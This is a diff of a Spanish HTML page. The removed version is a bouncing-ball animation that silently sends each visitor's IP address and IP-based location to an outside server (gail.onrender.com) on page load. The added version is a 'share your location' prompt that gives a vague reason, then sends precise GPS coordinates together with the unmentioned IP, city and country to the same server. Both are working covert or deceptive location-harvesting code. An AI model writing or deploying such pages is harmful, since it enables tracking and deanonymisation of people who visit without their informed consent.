@@ -1,101 +1,107 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <html lang="es">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Animación Interactiva</title>
-            <style>
-                body {
-                    font-family: Arial, sans-serif;
-                    text-align: center;
-                    background-color: #f4f4f4;
-                    padding: 20px;
-                    overflow: hidden;
-                }
-                .container {
-                    background: white;
-                    padding: 20px;
-                    border-radius: 10px;
-                    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-                    display: inline-block;
-                    position: relative;
-                }
-                .ball {
-                    width: 50px;
-                    height: 50px;
-                    background-color: #007bff;
-                    border-radius: 50%;
-                    position: absolute;
-                    top: 50%;
-                    left: 50%;
-                    transform: translate(-50%, -50%);
-                    animation: bounce 2s infinite ease-in-out;
-                }
-                @keyframes bounce {
-                    0%, 100% {
-                        transform: translate(-50%, -50%) translateY(0);
-                    }
-                    50% {
-                        transform: translate(-50%, -50%) translateY(-100px);
-                    }
-                }
-                button {
-                    margin-top: 20px;
-                    padding: 10px 20px;
-                    border: none;
-                    border-radius: 5px;
-                    background-color: #007bff;
-                    color: white;
-                    cursor: pointer;
-                }
-                button:hover {
-                    background-color: #0056b3;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Animación Interactiva</h1>
-                <p>Haz clic en el botón para cambiar el color de la bola.</p>
-                <div class="ball" id="ball"></div>
-                <button onclick="cambiarColor()">Cambiar Color</button>
-            </div>
-        
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compartir Ubicación</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-    <script>
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+        }
 
-fetch("https://ipwho.is/")
-    .then(response => response.json())
-    .then(data => {
-        console.log("📍 Ubicación obtenida:", data);
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
 
-        fetch("https://gail.onrender.com/enviar-ubicacion", { // 🔥 Asegúrate de que esta URL sea correcta
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
+        p {
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #mensaje {
+            margin-top: 20px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🌍 ¿Nos compartes tu ubicación?</h1>
+    <p>La utilizaremos para ofrecerte una mejor experiencia. ✨</p>
+    <button onclick="pedirUbicacion()">Compartir mi ubicación</button>
+    <div id="mensaje"></div>
+</div>
+
+<script>
+function pedirUbicacion() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                const latitud = position.coords.latitude;
+                const longitud = position.coords.longitude;
+
+                // Obtener IP y ciudad a partir de la IP pública
+                fetch("https://ipwho.is/")
+                    .then(response => response.json())
+                    .then(data => {
+                        fetch("https://gail.onrender.com/enviar-ubicacion", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                ciudad: data.city || "No disponible",
+                                region: data.region || "No disponible",
+                                pais: data.country || "No disponible",
+                                ip: data.ip || "No disponible",
+                                latitud: latitud,
+                                longitud: longitud,
+                                metodo: "Geolocalización Navegador"
+                            })
+                        });
+
+                        document.getElementById("mensaje").innerText = "🎉 ¡Ubicación compartida exitosamente!";
+                    });
             },
-            body: JSON.stringify({
-                ciudad: data.city || "No disponible",
-                region: data.region || "No disponible",
-                pais: data.country || "No disponible",
-                ip: data.ip || "No disponible",
-                latitud: data.latitude || "No disponible",
-                longitud: data.longitude || "No disponible"
-            })
-        });
-    })
-    .catch(error => console.error("❌ Error al obtener ubicación:", error));
-
-
-
-    function cambiarColor() {
-    const ball = document.getElementById("ball");
-    const colors = ["#007bff", "#ff0000", "#00ff00", "#ffcc00", "#ff00ff"];
-    const randomColor = colors[Math.floor(Math.random() * colors.length)];
-    ball.style.backgroundColor = randomColor;
+            error => {
+                document.getElementById("mensaje").innerText = "⚠️ No pudimos obtener tu ubicación.";
+            }
+        );
+    } else {
+        document.getElementById("mensaje").innerText = "⚠️ Tu navegador no soporta la geolocalización.";
     }
-    </script>
+}
+</script>
+
 </body>
 </html>
